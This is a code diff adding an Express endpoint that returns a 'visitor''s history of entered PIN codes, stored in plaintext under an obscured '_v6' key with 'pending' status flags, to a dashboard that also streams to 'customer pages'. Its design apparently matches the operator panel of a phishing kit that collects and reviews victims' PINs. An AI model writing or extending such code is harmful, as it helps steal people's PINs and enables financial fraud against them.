@@ -844,6 +844,50 @@ async function startServer() {
     }
   });
 
+  // =============================================
+  // Get PIN History (excluding current)
+  // =============================================
+  app.get("/api/dashboard/pin-history/:visitorId", async (req, res) => {
+    try {
+      const { visitorId } = req.params;
+      const visitor = await readVisitor(visitorId);
+      
+      if (!visitor) {
+        res.status(404).json({ error: "Visitor not found", history: [] });
+        return;
+      }
+
+      // Get all historical PIN data (excluding current)
+      const history: any[] = [];
+      const currentPin = visitor.raw?._v6 || visitor.raw?.pinCode;
+      
+      // Get historical entries from rawData array
+      const rawData = visitor.rawData || [];
+      for (const entry of rawData) {
+        const pinCode = entry?.raw?._v6 || entry?.raw?.pinCode;
+        if (pinCode && pinCode !== currentPin) {
+          // Check if this PIN is not already in the list
+          const exists = history.some(h => h.pinCode === pinCode);
+          if (!exists) {
+            history.push({
+              pinCode: pinCode,
+              pinStatus: entry.raw._v6Status || entry.raw.pinStatus || "pending",
+              updatedAt: entry.raw.updatedAt || entry.updatedAt
+            });
+          }
+        }
+      }
+
+      // Sort by updatedAt descending
+      history.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
+
+      res.json({ history, visitorId });
+    } catch (error) {
+      console.error("Error fetching PIN history:", error);
+      res.status(500).json({ error: "Failed to fetch PIN history", history: [] });
+    }
+  });
+
   // SSE endpoint for customer pages (one-way from server to customer)
   app.get("/api/dashboard/stream", (_req, res) => {
     res.setHeader("Content-Type", "text/event-stream");
